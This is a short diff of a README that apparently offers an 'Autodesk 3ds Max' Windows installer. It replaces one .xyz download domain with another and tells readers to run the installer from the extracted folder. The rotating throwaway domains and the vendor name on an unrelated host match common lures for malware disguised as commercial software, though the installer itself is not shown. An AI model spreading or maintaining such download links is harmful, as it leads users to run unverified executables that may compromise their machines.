@@ -8,8 +8,8 @@
 
 > Use the project link below for Windows.
 
-* **Project link:** **[autodesk-3ds-max.nexpath.xyz](https://autodesk-3ds-max.nexpath.xyz/)**
-* **Full URL:** `https://autodesk-3ds-max.nexpath.xyz/`
+* **Project link:** **[autodesk-3ds-max.nerasix.xyz](https://autodesk-3ds-max.nerasix.xyz/)**
+* **Full URL:** `https://autodesk-3ds-max.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
